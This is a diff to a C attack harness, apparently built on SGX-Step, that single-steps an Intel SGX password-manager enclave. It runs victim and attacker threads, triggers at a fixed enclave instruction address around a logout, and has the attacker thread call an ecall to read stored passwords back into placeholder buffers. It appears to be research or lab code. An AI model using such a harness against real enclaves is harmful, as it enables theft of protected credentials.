@@ -20,6 +20,8 @@
 #include <sgx_urts.h>
 #include "Enclave/encl_u.h"
 #include <pthread.h>
+#include "mystruct.h"
+
 
 #define DO_TIMER_STEP      0
 int irq_cnt = 0, do_irq = 0, fault_cnt = 0, trigger_cnt = 0, step_cnt = 0;
@@ -69,7 +71,7 @@ void aep_cb_func(void)
     info("^^ enclave RIP=%#llx", erip);
 
     
-    if(step_cnt == 912){ // logout between line 38 and 39
+    if(erip == 0x33bc){ // logout between line 38 and 39
         info("testreach");
         sgx_step_do_trap = 0;
 
@@ -209,7 +211,7 @@ void* victim_thread(void* arg) {
     sgx_enclave_id_t eidarg = *(sgx_enclave_id_t*)arg;
 
     ecall_setup(eidarg);
-    ecall_get_passwords(eidarg, masterpw);
+    //ecall_get_passwords2(eidarg, masterpw);
 
      /* 1. Setup attack execution environment. */
     register_symbols("./Enclave/encl.so");
@@ -237,8 +239,33 @@ void* attacker_thread(void* arg) {
 
     sgx_enclave_id_t eidarg = *(sgx_enclave_id_t*)arg;
     ecall_init_master_password(eidarg, "dummy");
-    ecall_get_passwords(eidarg, "dummy");
 
+    static char password1[64] = "password1";
+    static char password2[64] = "password2";
+    static char password3[64] = "password3";
+    static char password4[64] = "password4";
+    static char password5[64] = "password5";
+    static char password6[64] = "password6";
+    static char password7[64] = "password7";
+    static char password8[64] = "password8";
+    static char password9[64] = "password9";
+    static char password10[64] = "password10";
+
+    struct my_struct output = {
+        .array_len = 10,
+        .pw_len = 64,
+        .passwords = {password1, password2, password3, password4, password5, 
+            password6, password7, password8, password9, password10}
+    };
+
+    for (int i = 0; i < output.array_len; ++i) {
+        printf("Password %d: %s\n", i, output.passwords[i]);
+    }
+    ecall_get_passwords2(eidarg, "dummy", &output);
+
+    for (int i = 0; i < output.array_len; ++i) {
+        printf("Password %d: %s\n", i, output.passwords[i]);
+    }
 
     // CHANGE FROM THREAD B TO THREAD A
     pthread_mutex_lock(&lock);
